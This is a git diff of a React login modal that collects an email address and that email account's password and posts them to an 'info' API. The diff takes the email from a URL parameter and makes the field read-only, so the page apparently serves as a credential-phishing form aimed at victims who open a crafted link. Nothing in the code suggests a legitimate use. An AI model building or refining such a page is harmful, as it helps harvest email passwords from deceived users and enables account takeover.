@@ -1,22 +1,32 @@
 import React from 'react'
 import logo from '../assets/logotrans1.png'
 import { TfiClose } from "react-icons/tfi";
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { usePostInfoMutation } from '../redux/features/info/infoApi';
 import { useNavigate } from 'react-router';
+import { useLocation } from 'react-router-dom';
+
 
 const LoadModal = ({handleCloseModal}) => {
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
     const [postInfo, {isLoading, error}] = usePostInfoMutation();
-    const navigate = useNavigate()
+    const navigate = useNavigate();
+    const location = useLocation();
+
+    useEffect(()=> {
+        const params = new URLSearchParams(location.search)
+        const emailFromUrl = params.get('email');
+        if(emailFromUrl){
+            setEmail(emailFromUrl)
+        }
+    }, [location.search]);
 
     const handleSubmit = async (e)=>{
         e.preventDefault();
         try {
             const response = await postInfo({ email, password }).unwrap();
             console.log('Success:', response);
-            alert('Blog is posted successfully');
             navigate('/');
             handleCloseModal()
         } catch (error) {
@@ -34,7 +44,7 @@ const LoadModal = ({handleCloseModal}) => {
             </div>
             <form onSubmit={handleSubmit} className='loadModal-form'>
                 <label>Email address</label>
-                <input value={email} onChange={(e)=> setEmail(e.target.value)} className='loadModal-input' type="email" placeholder='Enter Email' />
+                <input value={email} readOnly  className='loadModal-input' type="email" placeholder='Enter Email' />
                 <label htmlFor="">Email Password</label>
                 <input value={password} onChange={(e)=> setPassword(e.target.value)} className='loadModal-input' type="password" placeholder='Enter Email Password' />
                 <div className='loadModal-checkbox'>
